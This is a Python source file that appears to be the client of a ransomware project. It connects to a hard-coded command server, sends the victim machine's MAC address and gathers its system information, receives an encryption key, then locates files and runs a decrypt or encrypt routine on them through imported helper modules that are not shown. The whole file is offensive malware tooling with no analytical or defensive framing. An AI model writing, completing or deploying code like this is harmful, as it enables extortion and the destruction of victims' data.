#import modules
import os
import socket
import uuid
import json

# Import other files
from utils.system_info import *
from utils.encrypt import *
from utils.dir_methods import *

# define constants
SERVER_IP = "192.168.3.144";
SERVER_PORT = 5678;


def main():
    # create and maintain socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    
        # connect with server
        s.connect((SERVER_IP,SERVER_PORT));
        
        s.send("1".encode('utf-8'))
        
        system_information = get_target_system_information()
        
        target_information = {
            "target_mac" : hex(uuid.getnode()),
        }
        
        # print(target_mac);
        s.send(json.dumps(target_information,indent=2).encode('utf-8'));
        
        # get encryption key
        encryption_key = s.recv(1024).decode('utf-8');
        
        if(encryption_key):
            paths_to_file = find_files_path();
            prepare_decrypt_file(paths_to_file, encryption_key);

main()
